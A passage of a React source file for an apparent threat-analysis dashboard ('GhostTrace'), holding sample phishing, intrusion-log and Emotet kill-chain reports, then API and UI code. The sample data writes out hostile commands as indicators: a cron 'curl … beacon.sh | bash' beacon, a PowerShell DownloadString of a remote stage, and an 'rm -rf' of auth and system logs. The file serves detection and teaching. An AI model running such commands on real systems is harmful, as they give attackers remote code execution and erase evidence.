    form_action:"http://185.220.101.47/collect.php",
    hidden_iframes:2, obfuscated_js:true,
    ext_scripts:["http://185.220.101.47/tracker.js"],
  },
  checks:[
    {n:"SSL Certificate",v:"Self-signed / Expired (2022)",ok:false},
    {n:"Domain Age",v:"3 days — newly registered",ok:false},
    {n:"VirusTotal",v:"23/80 vendors flagged",ok:false},
    {n:"PhishTank",v:"Confirmed active phishing",ok:false},
    {n:"AbuseIPDB",v:"94 abuse reports on host IP",ok:false},
    {n:"Typosquatting",v:"'paypa1' impersonates PayPal",ok:false},
    {n:"Login Form Action",v:"Exfiltrates creds to bare IP",ok:false},
    {n:"Hidden IFrames",v:"2 zero-size iframes detected",ok:false},
    {n:"Obfuscated JavaScript",v:"eval/atob/unescape detected",ok:false},
    {n:"HTTPS Enforced",v:"Yes (invalid cert)",ok:null},
    {n:"HSTS Header",v:"Missing",ok:false},
    {n:"Content-Security-Policy",v:"Missing",ok:false},
  ],
  injections:[
    {sev:"critical",icon:"💉",title:"Credential Harvesting Form",detail:"Login form POSTs username + password directly to http://185.220.101.47/collect.php — an attacker-controlled server. Credentials are captured before any TLS encryption can protect them."},
    {sev:"critical",icon:"📜",title:"Obfuscated Malicious JavaScript",detail:"eval(atob(unescape('...'))) pattern detected — multi-layer obfuscation hiding browser fingerprinting and anti-sandbox detection code. Characteristic of commercial phishing kits (16shop, LogoKit)."},
    {sev:"critical",icon:"🪟",title:"Hidden IFrame Injection (×2)",detail:"Two zero-size iframes found pointing to external origins. Used for invisible content loading, tracker siloing, or redirecting automated scanners to a decoy benign page while showing phishing to real victims."},
    {sev:"warn",icon:"📡",title:"External Malicious Tracking Script",detail:"http://185.220.101.47/tracker.js loaded from the same C2 IP. Collects visitor IP, user agent, timezone, screen resolution — filters out security researchers and sandbox environments before showing phishing content."},
    {sev:"warn",icon:"🔒",title:"Missing Security Headers",detail:"No Content-Security-Policy, no HSTS, no X-Frame-Options. The absence of all security headers is consistent with a freshly deployed phishing kit with no hardening. Also leaves the site vulnerable to further injection."},
  ],
  vulns:[
    {sev:"critical",name:"Outdated Server Stack — PHP 5.6 / Apache 2.2",cve:"Multiple CVEs (EOL since 2018)",evidence:"Server: Apache/2.2\nX-Powered-By: PHP/5.6.40\n\nEOL software with no security patches since 2018.",fix:"Upgrade to PHP 8.2+ and Apache 2.4+"},
    {sev:"high",name:"Missing Content Security Policy (CSP)",cve:"CWE-693",evidence:"No Content-Security-Policy header present.\n\nAllows inline script injection and cross-site data loading.",fix:"Implement strict CSP: script-src 'self'; object-src 'none'"},
    {sev:"high",name:"Missing HTTP Strict Transport Security",cve:"CWE-523",evidence:"No Strict-Transport-Security header found.\n\nAllows HTTPS downgrade attacks.",fix:"Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"},
    {sev:"high",name:"Self-Signed / Expired SSL Certificate",cve:"CWE-295",evidence:"Issuer: CN=secure-paypa1.com\nExpiry: 2022-01-01\nNot signed by a trusted Certificate Authority.",fix:"Obtain valid cert from Let's Encrypt (free) or trusted CA."},
    {sev:"medium",name:"Missing X-Frame-Options / Clickjacking Protection",cve:"CWE-1021",evidence:"No X-Frame-Options or frame-ancestors CSP directive.",fix:"Add: X-Frame-Options: DENY"},
    {sev:"medium",name:"Missing X-Content-Type-Options",cve:"CWE-430",evidence:"No X-Content-Type-Options: nosniff header.",fix:"Add: X-Content-Type-Options: nosniff"},
  ],
  health:{total:8,ssl:0,malware:0,vulns:10,rep:5,content:15},
  risk:96, level:"CRITICAL",
  iocs:{
    ips:["185.220.101.47"],
    domains:["secure-paypa1.com"],
    urls:["http://185.220.101.47/collect.php","http://185.220.101.47/tracker.js"],
    emails:[],hashes:[],reg_keys:[],commands:[],cves:["CWE-693","CWE-523","CWE-295"],
  },
  url_timeline:[
    {t:"T+0 days",e:"Domain Registration",d:"secure-paypa1.com registered via NameCheap with privacy protection. Typosquats paypal.com using homoglyph attack (l→1).",sev:"critical"},
    {t:"T+0 days",e:"Infrastructure Setup",d:"Apache/PHP server configured on bulletproof host 185.220.101.47 (Frantech Solutions, RU). Credential collection endpoint collect.php deployed.",sev:"critical"},
    {t:"T+1 day",e:"Phishing Kit Installed",d:"PayPal login clone deployed with credential harvesting form, browser fingerprinting tracker.js, hidden iframes, and obfuscated anti-sandbox JS.",sev:"high"},
    {t:"T+2 days",e:"Campaign Launched",d:"Phishing emails distributed impersonating PayPal security alerts. Victims directed to secure-paypa1.com/login/verify.",sev:"critical"},
    {t:"T+3 days",e:"First Detection (GhostTrace)",d:"23/80 VirusTotal vendors flagged. PhishTank confirmation received. AbuseIPDB reports filed for host IP.",sev:"medium"},
  ],
  ai:`<span class="tc-b tc-r">⚑ THREAT CLASSIFICATION: Active Phishing Campaign — PayPal Credential Harvesting (96/100)</span>

All evidence confirms this is a <span class="tc-b tc-r">freshly deployed phishing kit targeting PayPal users</span>, operated from a bulletproof hosting provider that ignores abuse complaints.

<span class="tc-b tc-a">ATTACK ENTRY VECTOR:</span>
Victims arrive via a phishing email with subject line such as "Your PayPal account has been limited — verify immediately." The domain <span class="tc-r">secure-paypa1.com</span> uses a homoglyph attack substituting lowercase 'l' with digit '1' — visually identical at standard font sizes.

<span class="tc-b tc-a">EXECUTION CHAIN:</span>
1. Victim clicks email link → <span class="tc-c">secure-paypa1.com/login/verify</span>
2. <span class="tc-c">tracker.js</span> fingerprints browser (sandbox/VPN detection) → shows real phishing or decoy to researchers
3. Victim enters credentials → POSTed to <span class="tc-r">185.220.101.47/collect.php</span>
4. Attacker receives credentials in real-time via Telegram bot or email
5. Victim redirected to real PayPal login to suppress suspicion

<span class="tc-b tc-a">INFRASTRUCTURE:</span>
IP <span class="tc-r">185.220.101.47</span> is hosted by Frantech Solutions — a known bulletproof provider. Domain was registered 3 days ago under privacy protection, consistent with a fresh campaign before blacklisting takes effect (typically 3–7 day window).

<span class="tc-b tc-a">MITRE ATT&CK:</span>
T1566.002 (Spearphishing Link) → T1598 (Steal Web Session Cookie) → T1539 (Steal Application Access Token)

<span class="tc-b tc-r">⚠ DO NOT VISIT OR ENTER CREDENTIALS. Report domain to NameCheap abuse@namecheap.com. Block IP at perimeter firewall. Submit to Google SafeBrowsing if not yet reported.</span>`
};

const D_LOG = {
  lines:12847, suspicious:34, critical:8, anomalies:5,
  risk:72, level:"HIGH",
  timeline:[
    {t:"2024-11-28 02:14:33",e:"SSH Brute Force Begins",d:"894 failed login attempts from 185.220.101.47 over 8 minutes at ~1.8 attempts/sec. Targeted accounts: root, admin, ubuntu, ec2-user.",sev:"high"},
    {t:"2024-11-28 02:22:11",e:"Successful Authentication",d:"SSH login accepted for user 'ubuntu' from 185.220.101.47 port 49102. First successful login from this IP after brute force. Likely password reuse or weak credential.",sev:"critical"},
    {t:"2024-11-28 02:22:45",e:"Privilege Escalation via sudo",d:"sudo -i executed 34 seconds post-login. User 'ubuntu' escalated to root. NOPASSWD configuration on sudo (misconfiguration) granted immediate root without password prompt.",sev:"critical"},
    {t:"2024-11-28 02:23:01",e:"Cron Persistence Established",d:"Cron job added: */5 * * * * curl http://185.220.101.47/beacon.sh | bash — persistent root-level execution channel. Attacker can push arbitrary code every 5 minutes.",sev:"critical"},
    {t:"2024-11-28 02:24:18",e:"C2 Beacon Confirmed",d:"Outbound HTTP GET to http://185.220.101.47/beacon.sh — 200 OK, 4.2KB payload. Repeated every 5 minutes. Confirmed command-and-control channel established.",sev:"critical"},
    {t:"2024-11-28 02:31:44",e:"Lateral Movement — Internal Scan",d:"SSH connection attempts to internal hosts 10.0.0.{2-254}. Full /24 subnet sweep. Successful SSH connections established to 10.0.0.5 and 10.0.0.12.",sev:"critical"},
    {t:"2024-11-28 02:45:00",e:"Data Exfiltration",d:"847MB outbound transfer to 185.220.101.47 via HTTP POST over 18 minutes. Volume and timing consistent with database dump exfiltration (mysqldump or pg_dump output).",sev:"critical"},
    {t:"2024-11-28 03:02:10",e:"Log Tampering Attempt",d:"rm -rf /var/log/auth.log /var/log/syslog executed under root. Attacker attempted to erase intrusion evidence. Logs preserved by pre-configured remote rsyslog.",sev:"high"},
  ],
  iocs:{
    ips:["185.220.101.47","10.0.0.5","10.0.0.12"],
    commands:["sudo -i","curl http://185.220.101.47/beacon.sh | bash","crontab -e","rm -rf /var/log/auth.log","ssh ubuntu@10.0.0.5"],
    urls:["http://185.220.101.47/beacon.sh"],
    hashes:[],domains:[],emails:[],reg_keys:[],cves:[],
  },
  ai:`<span class="tc-b tc-r">⚑ THREAT CLASSIFICATION: Full Intrusion — Brute Force → Root Compromise → Persistence → Lateral Movement → Exfiltration</span>

These logs document a <span class="tc-b tc-r">complete attack lifecycle</span>. The attacker moved from initial access to data exfiltration in under <span class="tc-c">50 minutes</span>, suggesting a skilled operator with scripted tooling.

<span class="tc-b tc-a">PHASE 1 — INITIAL ACCESS (T1110.001 Brute Force):</span>
894 SSH attempts in 8 minutes from <span class="tc-r">185.220.101.47</span>. The relatively low attempt count before success (vs. typical millions) suggests a targeted attack using a credential list from a prior breach — possibly from a leaked employee password database.

<span class="tc-b tc-a">PHASE 2 — PRIVILEGE ESCALATION (T1548.003 Sudo Abuse):</span>
The ubuntu user had <span class="tc-c">NOPASSWD</span> sudo configured — an extremely common misconfiguration on AWS EC2 and DigitalOcean instances. Root was obtained 34 seconds post-login with a single command.

<span class="tc-b tc-a">PHASE 3 — PERSISTENCE (T1053.003 Cron Job):</span>
<span class="tc-c">*/5 * * * * curl http://185.220.101.47/beacon.sh | bash</span> — this creates a persistent, remotely-controllable execution channel with root privileges that survives process kills and reboots.

<span class="tc-b tc-a">PHASE 4 — LATERAL MOVEMENT (T1021.004 SSH):</span>
Full /24 scan followed by successful SSH to 10.0.0.5 and 10.0.0.12. Attacker likely found SSH keys in /root/.ssh/ or reused the compromised password.

<span class="tc-b tc-a">PHASE 5 — EXFILTRATION (T1048.003 HTTP Exfil):</span>
847MB in 18 minutes. Database dump rate. All internal data including potentially customer PII, API keys, and application secrets may be in attacker's hands.

<span class="tc-b tc-r">⚠ CRITICAL: Isolate ALL three hosts immediately. Rotate every credential. Determine what 847MB contained. File incident report — if customer PII, GDPR/breach notification laws apply.</span>`
};

const HISTORY = [
  {id:"s001",type:"file",name:"invoice_update_Q4.exe",level:"critical",risk:87,date:"2024-11-30 14:22",findings:4,iocs:9},
  {id:"s002",type:"url",name:"secure-paypa1.com",level:"critical",risk:96,date:"2024-11-30 14:08",findings:12,iocs:6},
  {id:"s003",type:"log",name:"access_logs_nov.txt",level:"critical",risk:72,date:"2024-11-30 13:10",findings:8,iocs:7},
  {id:"s004",type:"file",name:"company_logo.png",level:"clean",risk:2,date:"2024-11-30 12:44",findings:0,iocs:0},
  {id:"s005",type:"file",name:"suspicious_update.js",level:"high",risk:68,date:"2024-11-30 11:30",findings:3,iocs:4},
  {id:"s006",type:"url",name:"http://malware-cdn.ru/payload",level:"critical",risk:94,date:"2024-11-29 22:15",findings:9,iocs:5},
  {id:"s007",type:"ioc",name:"IOC Batch — phishing email headers",level:"high",risk:71,date:"2024-11-29 18:02",findings:14,iocs:22},
  {id:"s008",type:"file",name:"resume_cv.pdf",level:"medium",risk:41,date:"2024-11-29 15:30",findings:2,iocs:1},
  {id:"s009",type:"url",name:"update-flash.xyz",level:"high",risk:77,date:"2024-11-29 12:10",findings:7,iocs:4},
  {id:"s010",type:"log",name:"firewall_logs_week.txt",level:"medium",risk:38,date:"2024-11-28 09:55",findings:3,iocs:6},
  {id:"s011",type:"file",name:"contract_draft.docx",level:"low",risk:12,date:"2024-11-28 08:22",findings:1,iocs:0},
  {id:"s012",type:"url",name:"legit-company.com",level:"clean",risk:3,date:"2024-11-27 16:44",findings:0,iocs:0},
];

const ATTACK_CHAIN = {
  name:"Emotet Intrusion — Full Kill Chain",
  target:"invoice_update_Q4.exe · 2024-11-30",
  risk:87, level:"CRITICAL",
  phases:[
    {phase:"Initial Access",tactic:"T1566.001",technique:"Phishing Attachment",detail:"Victim received email 'Invoice Q4 Update — Action Required'. Attachment invoice_update_Q4.exe disguised as PDF using double-extension and PDF icon overlay to bypass casual inspection.",sev:"critical",icon:"📧"},
    {phase:"Execution",tactic:"T1059.001",technique:"PowerShell Execution",detail:"Dropper runs cmd.exe /c powershell -encodedCommand [Base64]. Decoded: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1'). Second-stage payload executed in memory — never touches disk.",sev:"critical",icon:"⚡"},
    {phase:"Defense Evasion",tactic:"T1027",technique:"Packed / Obfuscated Binary",detail:"UPX-modified packing with custom XOR decryption stub. Runtime-only unpacking in memory defeats static AV signatures. Section entropy 7.91 confirms near-maximum payload density. 61/72 VirusTotal engines detect post-unpack.",sev:"high",icon:"🛡"},
    {phase:"Persistence",tactic:"T1547.001",technique:"Registry AutoRun Key",detail:"Writes svchost32.exe to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Binary placed in C:\\ProgramData\\ mimicking system directory. Executes before user login on every boot.",sev:"critical",icon:"⚙"},
    {phase:"Process Injection",tactic:"T1055.001",technique:"Remote Thread Injection",detail:"CreateRemoteThread + VirtualAllocEx + WriteProcessMemory inject payload DLL into svchost.exe. All C2 traffic appears to originate from a trusted Windows process — bypasses process-based behavioral monitoring.",sev:"critical",icon:"💉"},
    {phase:"Command & Control",tactic:"T1071.001",technique:"HTTP C2 Beacon",detail:"Periodic HTTP GET to http://185.220.101.47/c2/beacon every ~5 minutes. Sends system fingerprint. Receives encrypted task assignments: credential harvesting modules, lateral movement tools, or ransomware deployment payloads.",sev:"critical",icon:"📡"},
    {phase:"Credential Access",tactic:"T1555.003",technique:"Browser Credential Theft",detail:"Downloaded stealer module targets Chrome, Firefox, Edge credential vaults. Extracts saved passwords, cookies, and active session tokens. All data encrypted and POSTed to C2. Known Emotet secondary payload behavior.",sev:"high",icon:"🔑"},
    {phase:"Lateral Movement",tactic:"T1078",technique:"Valid Domain Credentials",detail:"Harvested credentials used for SMB/RDP authentication to adjacent hosts. Emotet propagates to additional machines, expanding attacker foothold. Enables domain-wide ransomware deployment (Ryuk, Conti).",sev:"critical",icon:"↔"},
  ],
  iocs:{
    ips:["185.220.101.47"],
    domains:[],
    hashes:["a1b2c3d4e5f678901234567890abcdef"],
    reg_keys:["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32"],
    commands:["cmd.exe /c powershell -encodedCommand JABzAG...","IEX(New-Object Net.WebClient).DownloadString(...)"],
    urls:["http://185.220.101.47/c2/beacon","http://185.220.101.47/stage2.ps1"],
    emails:[],cves:[],
  }
};

const FILE_STEPS=[
  {label:"Extracting file metadata & magic bytes",dur:550},
  {label:"Computing MD5 / SHA1 / SHA256 hashes",dur:700},
  {label:"Entropy analysis — detecting packing / encryption",dur:900},
  {label:"PE header & section table analysis",dur:650},
  {label:"String extraction & suspicious pattern matching",dur:800},
  {label:"Import table & dangerous API detection",dur:700},
  {label:"Matching against 10,204 YARA signatures",dur:1100},
  {label:"VirusTotal hash reputation lookup",dur:900},
  {label:"AI threat classification & behavior analysis",dur:1500},
];

const URL_STEPS=[
  {label:"Resolving DNS & IP geolocation",dur:500},
  {label:"SSL / TLS certificate chain validation",dur:600},
  {label:"VirusTotal URL & IP reputation (72 engines)",dur:950},
  {label:"PhishTank & URLScan.io lookup",dur:700},
  {label:"AbuseIPDB reputation check",dur:650},
  {label:"Fetching & parsing full page content",dur:800},
  {label:"Login form & credential harvest detection",dur:700},
  {label:"Malicious script & iframe analysis",dur:900},
  {label:"Vulnerability & misconfiguration detection",dur:850},
  {label:"AI threat explanation & attack reconstruction",dur:1400},
];

const LOG_STEPS=[
  {label:"Parsing log format & normalizing timestamps",dur:600},
  {label:"Detecting authentication failures & brute force",dur:750},
  {label:"Identifying privilege escalation events",dur:700},
  {label:"Tracing C2 beacon patterns",dur:850},
  {label:"Lateral movement & network anomaly detection",dur:800},
  {label:"Data exfiltration volume analysis",dur:750},
  {label:"Extracting all IOCs from log entries",dur:700},
  {label:"AI attack chain reconstruction",dur:1500},
];

const DEMO_LOGS = `2024-11-28 02:14:33 sshd[2341]: Failed password for root from 185.220.101.47 port 44231 ssh2
2024-11-28 02:14:35 sshd[2341]: Failed password for admin from 185.220.101.47 port 44231 ssh2
2024-11-28 02:22:11 sshd[2398]: Accepted password for ubuntu from 185.220.101.47 port 49102 ssh2
2024-11-28 02:22:45 sudo[2401]: ubuntu : COMMAND=/bin/bash -i
2024-11-28 02:23:01 cron[2410]: (root) ADD (*/5 * * * * curl http://185.220.101.47/beacon.sh | bash)
2024-11-28 02:24:18 kernel: OUTBOUND 185.220.101.47:80 GET /beacon.sh 200 4286B
2024-11-28 02:31:44 sshd[2502]: Accepted password for ubuntu from 10.0.0.5 port 22
2024-11-28 02:45:00 kernel: OUTBOUND 185.220.101.47:80 POST /exfil 847MB
2024-11-28 03:02:10 bash[2601]: uid=0(root) rm -rf /var/log/auth.log /var/log/syslog`;

const DEMO_IOC_TEXT = `Incident report — 2024-11-28:
Host 10.0.0.5 contacted 185.220.101.47 over port 443.
Domain evil-c2-server.com used for command and control.
File hash: a1b2c3d4e5f678901234567890abcdef found in memory dump.
SHA256: 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
Attacker email: attacker@malicious-actor.ru
Dropper: http://185.220.101.47/payload.exe
PowerShell: cmd.exe /c powershell -nop -w hidden -encodedCommand JABz...
Registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32
CVE-2021-34527 exploited for privilege escalation.
Second stage: https://malware-cdn.ru/stage2.bin`;

// ═══════════════════════════════════════════════════════════════════════════════
// SHARED COMPONENTS
// ═══════════════════════════════════════════════════════════════════════════════

const API_BASE = (import.meta.env.VITE_GHOSTTRACE_API_BASE || "http://localhost:8000").replace(/\/+$/, "");
let RUNTIME_API_KEY = (import.meta.env.VITE_GHOSTTRACE_API_KEY || "").trim();
const API_STORAGE_KEY = "ghosttrace.settings.apiKeys.v1";
const SETTINGS_STORAGE_KEY = "ghosttrace.settings.toggles.v1";

function setRuntimeApiKey(value) {
  RUNTIME_API_KEY = String(value || "").trim();
}

function reportClientError(context, error) {
  const msg = error?.message || String(error || "Unknown error");
  console.error(`[GhostTrace] ${context}: ${msg}`, error);
}

function apiHeaders(extra = {}) {
  return RUNTIME_API_KEY ? { ...extra, "x-api-key": RUNTIME_API_KEY } : extra;
}

async function apiJson(path, init = {}) {
  const res = await fetch(`${API_BASE}${path}`, { ...init, headers: apiHeaders(init.headers || {}) });
  if (!res.ok) {
    let detail = "";
    try {
      const body = await res.json();
      detail = body?.detail ? ` - ${body.detail}` : "";
    } catch {}
    const err = new Error(`API ${path} failed: ${res.status}${detail}`);
    err.status = res.status;
    throw err;
  }
  return res.json();
}

async function apiBlob(path, init = {}) {
  const res = await fetch(`${API_BASE}${path}`, { ...init, headers: apiHeaders(init.headers || {}) });
  if (!res.ok) {
    const err = new Error(`API ${path} failed: ${res.status}`);
    err.status = res.status;
    throw err;
  }
  return res.blob();
}

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function normalizeLevel(value) {
  const v = String(value || "").toLowerCase();
  if (["critical", "high", "medium", "low", "clean"].includes(v)) return v;
  if (v === "suspicious") return "medium";
  if (v === "safe") return "clean";
  return "medium";
}

function mapHistoryItem(doc, type) {
  const result = doc?.result || {};
  const risk = Number(doc?.risk_score ?? result?.risk?.score ?? result?.risk_score ?? 0);
  const level = normalizeLevel(doc?.severity ?? result?.risk?.severity ?? result?.threat_level);
  const iocs = result?.iocs || {};
  const iocCount = Object.values(iocs).reduce((acc, arr) => acc + ((arr && arr.length) || 0), 0);
  const findings = Array.isArray(result?.suspicious_strings)
    ? result.suspicious_strings.length
    : Array.isArray(result?.findings)
      ? result.findings.length
      : 0;
  return {
    id: doc?.id || `${type}-${Math.random()}`,
    type,
    name: doc?.filename || doc?.url || result?.filename || result?.input_url || `${type} scan`,
    level,
    risk,
    date: doc?.created_at ? new Date(doc.created_at).toLocaleString() : "-",
    findings,
    iocs: iocCount,
    ts: doc?.created_at ? new Date(doc.created_at).getTime() : 0,
  };
}

function severityFromText(text = "") {
  const t = String(text).toLowerCase();
  if (/(critical|rce|credential|exfil|malicious|phishing|backdoor)/.test(t)) return "critical";
  if (/(high|suspicious|obfuscat|expired|missing)/.test(t)) return "high";
  if (/(medium|warning|warn)/.test(t)) return "medium";
  return "low";
}

function mapUrlResult(data, scanUrl) {
  const iocMap = { ips: [], domains: [], urls: [], emails: [], hashes: [], reg_keys: [], commands: [], cves: [] };
  (data?.iocs || []).forEach((row) => {
    const t = String(row?.type || "").toLowerCase();
    if (!row?.value) return;
    if (t === "ip") iocMap.ips.push(row.value);
    else if (t === "domain") iocMap.domains.push(row.value);
    else if (t === "url") iocMap.urls.push(row.value);
    else if (t === "email") iocMap.emails.push(row.value);
  });

  const ssl = data?.reputation_signals?.ssl_certificate_analysis || {};
  const repSignals = data?.reputation_signals || {};
  const provider = repSignals?.provider_status || {};
  const domainRep = data?.threat_intel_mapping?.ip_reputation || "";
  const ipMatch = String(domainRep).match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
  const parsedInput = (() => {
    try { return new URL(data?.input_url || scanUrl || "https://example.com"); } catch { return null; }
  })();
  const page = data?.page_artifacts || {};
  const findings = data?.findings || [];
  const vulnFindings = data?.vulnerability_findings || [];
  const injFindings = data?.malware_injection_findings || [];
  const recs = data?.recommendations || [];
  const health = data?.health_breakdown || {};

  const vulns = vulnFindings.map((v, i) => ({
    sev: severityFromText(v),
    name: `Detected Vulnerability ${i + 1}`,
    cve: "CWE-693",
    evidence: v,
    fix: recs[0] || "Apply defensive hardening and patch exposed components.",
  }));

  const injections = injFindings.map((v) => ({
    sev: severityFromText(v),
    icon: "💉",
    title: "Malware Injection Indicator",
    detail: v,
  }));

  const checks = [
    { n: "Threat Level", v: String(data?.threat_level || "unknown").toUpperCase(), ok: false },
    { n: "Risk Score", v: `${Number(data?.risk_score ?? 0)}/100`, ok: Number(data?.risk_score ?? 0) < 35 },
    { n: "Suspicious Behaviors", v: String(data?.suspicious_behaviors_detected ?? 0), ok: Number(data?.suspicious_behaviors_detected ?? 0) === 0 },
    { n: "TLS Status", v: ssl?.status || "Unknown", ok: ssl?.status === "Certificate valid" },
    { n: "Page Scripts", v: `${page?.script_count ?? 0} scripts`, ok: (page?.script_count ?? 0) < 10 },
    { n: "Hidden IFrames", v: `${page?.hidden_iframe_count ?? 0}`, ok: (page?.hidden_iframe_count ?? 0) === 0 },
  ];

  const totalRisk = Number(data?.risk_score ?? 0);
  const vtScore = Number(data?.reputation_signals?.urlscan?.score ?? 0);
  const abuseScoreMatch = String(domainRep).match(/score\s+(\d+)\/100/i);
  const abuseScore = abuseScoreMatch ? Number(abuseScoreMatch[1]) : null;
  const safeIocs = { ips: [], domains: [], urls: [], emails: [], hashes: [], reg_keys: [], commands: [], cves: [] };
  return {
    url: data?.input_url || scanUrl,
    ip: iocMap.ips[0] || ipMatch?.[0] || "N/A",
    country: "N/A",
    isp: "N/A",
    domain_age: "N/A",
    registrar: "N/A",
    redirects: [data?.input_url || scanUrl || "N/A"],
    ssl: {
      valid: ssl?.has_tls || false,
      issuer: ssl?.issuer || "Unknown",
      expiry: ssl?.not_after || "Unknown",
    },
    tech: (data?.website_compromise_indicators || data?.findings || []).slice(0, 4),
    rep: {
      vt: provider?.virustotal ? (vtScore || "Configured") : "Not configured",
      urlscan: repSignals?.urlscan?.verdict === true ? "Malicious" : repSignals?.urlscan?.verdict === false ? "No-malicious verdict" : "Unavailable",
      abuseipdb: abuseScore ?? (provider?.abuseipdb ? "Configured" : "Not configured"),
      phishtank: provider?.phishtank ? "Configured" : "Not configured",
    },
    checks,
    injections,
    vulns,
    health: {
      total: Math.max(0, 100 - totalRisk),
      ssl: Math.round((Number(health?.ssl_security ?? 0) / 100) * 20),
      malware: Math.round((Number(health?.malware_presence ?? 0) / 100) * 30),
      vulns: Math.round((Number(health?.vulnerability_exposure ?? 0) / 100) * 20),
      rep: Math.round((Number(health?.reputation ?? 0) / 100) * 15),
      content: Math.round((Number(health?.content_integrity ?? 0) / 100) * 15),
    },
    content: {
      login_form: (page?.suspicious_form_count ?? 0) > 0,
      pass_field: (page?.suspicious_form_count ?? 0) > 0,
      form_action: "Derived from backend page analysis",
      hidden_iframes: page?.hidden_iframe_count ?? 0,
      obfuscated_js: (page?.suspicious_script_patterns || []).length > 0,
      ext_scripts: page?.external_script_samples || [],
    },
    iocs: { ...safeIocs, ...iocMap },
    risk: totalRisk,
    level: String(data?.threat_level || "unknown").toUpperCase(),
    ai: data?.threat_explanation || "No AI explanation available for this scan.",
    url_timeline: findings.slice(0, 5).map((f, idx) => ({
      t: `Event ${idx + 1}`,
      e: "Backend Finding",
      d: f,
      sev: severityFromText(f),
    })),
  };
}

function mapLogResult(data, scanText) {
  const patterns = data?.behavior_patterns || [];
  const timeline = patterns.map((p, i) => ({
    t: `Stage ${i + 1}`,
    e: p,
    d: `Detected behavior pattern: ${p}`,
    sev: severityFromText(p),
  }));
  const suspicious = patterns.length;
  return {
    ...D_LOG,
    lines: scanText.split(/\r?\n/).filter(Boolean).length,
    suspicious,
    critical: String(data?.threat_level || "").toLowerCase() === "critical" ? Math.max(1, suspicious) : Math.min(suspicious, 2),
    anomalies: suspicious,
    risk: Number(data?.risk_score ?? D_LOG.risk),
    level: String(data?.threat_level || "high").toUpperCase(),
    iocs: {
      ...D_LOG.iocs,
      ips: data?.iocs?.ips || [],
      domains: data?.iocs?.domains || [],
      commands: data?.iocs?.suspicious_commands || [],
    },
    ai: data?.ai_explanation || D_LOG.ai,
    timeline: timeline.length ? timeline : D_LOG.timeline,
  };
}

const Spinner = () => <div className="spinner" />;

const Pbar = ({ val, color = "green" }) => (
  <div className="pbar">
    <div className={`pbar-fill pbar-${color}`} style={{ width: `${Math.min(val, 100)}%` }} />
  </div>
);

function Badge({ level, children }) {
  const l = (level || "info").toLowerCase();
  const map = {
    critical:"b-critical", high:"b-high", medium:"b-medium", low:"b-low",
    clean:"b-clean", info:"b-info", ip:"b-info", domain:"b-purple",
    md5:"b-high", sha256:"b-high", url:"b-url", email:"b-clean",
    file:"b-file", log:"b-log", ioc:"b-ioc", purple:"b-purple", pink:"b-pink",
  };
  return <span className={`badge ${map[l] || "b-info"}`}>{children || level}</span>;
}

function SecHd({ children }) {
  return <div className="sec-hd">{children}</div>;
}

function Terminal({ title, content }) {
  return (
    <div className="terminal">
      <div className="term-bar">
        <div className="term-dots">
          <div className="term-dot" style={{ background: "#ff5f57" }} />
          <div className="term-dot" style={{ background: "#febc2e" }} />
          <div className="term-dot" style={{ background: "#28c840" }} />
        </div>
        <span className="term-label">⬡ GhostTrace AI — {title}</span>
      </div>
      <div className="term-body" dangerouslySetInnerHTML={{ __html: content }} />
    </div>
  );
}

function IOCPanel({ iocs }) {
  if (!iocs) return null;
  const secs = [
    { key:"ips",     label:"IP Addresses",        cls:"ioc-ip",     icon:"🔌" },
    { key:"domains", label:"Domains",             cls:"ioc-domain", icon:"🌐" },
    { key:"urls",    label:"Malicious URLs",       cls:"ioc-url",    icon:"🔗" },
    { key:"hashes",  label:"File Hashes",          cls:"ioc-hash",   icon:"🔐" },
    { key:"emails",  label:"Email Addresses",      cls:"ioc-email",  icon:"✉"  },
    { key:"reg_keys",label:"Registry Keys",        cls:"ioc-reg",    icon:"⚙"  },
    { key:"commands",label:"Suspicious Commands",  cls:"ioc-cmd",    icon:"💻" },
    { key:"cves",    label:"CVEs / CWEs",          cls:"ioc-cve",    icon:"⚠"  },
  ];
  const any = secs.some(s => (iocs[s.key] || []).length > 0);
  if (!any) return (
    <div className="empty-state">
      <div className="empty-icon">🔎</div>
      <div className="empty-title">No IOCs detected</div>
      <div className="empty-sub">No indicators of compromise were found in this input.</div>
    </div>
  );
  return (
    <div>
      {secs.map(s => {
        const items = iocs[s.key] || [];
        if (!items.length) return null;
        return (
          <div key={s.key} className="mb16">
            <SecHd>{s.label} ({items.length})</SecHd>
            <div className="ioc-grid">
              {items.map((v, i) => (
                <span key={i} className={`ioc ${s.cls}`}>
                  {s.icon} {v.length > 64 ? v.slice(0, 64) + "…" : v}
                </span>
              ))}
            </div>
          </div>
        );
      })}
    </div>
  );
}

function EntropyBar({ name, val, sus }) {
  const pct = Math.min((val / 8) * 100, 100);
  const color = val > 7.5 ? "var(--red)" : val > 6.5 ? "var(--amber)" : "var(--green)";
  return (
    <div className="ent-row">
      <div className="ent-hd">
        <span style={{ color: "var(--t2)" }}>{name}</span>
        <span style={{ color }}>{val.toFixed(2)} {sus && "⚠"}</span>
      </div>
      <div className="ent-bar">
        <div className="ent-fill" style={{ width: `${pct}%`, background: color }} />
      </div>
    </div>
  );
}

function RiskDisplay({ score, level, children }) {
  const l = (level || "").toLowerCase();
  return (
    <div className="risk-wrap">
      <div className={`risk-ring ${l}`}>
        <span className={`risk-num ${l}`}>{score}</span>
        <span className="risk-denom">/ 100</span>
      </div>
      <div className="f1">
        <div className="fac gap8 mb8">
          <span className="mono txt-xs txt-muted" style={{ letterSpacing: 1 }}>THREAT SCORE</span>
          <Badge level={l}>{level}</Badge>
        </div>
        {children}
      </div>
    </div>
  );
}

function ScanProgress({ steps, cur, done }) {
  const pct = Math.round((done.length / steps.length) * 100);
  return (
    <div>
      <div className="fac gap12 mb20">
        <Spinner />
        <div className="f1">
          <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 6 }}>Scanning in progress…</div>
          <Pbar val={pct} />
        </div>
        <span className="mono txt-xs txt-muted">{pct}%</span>
      </div>
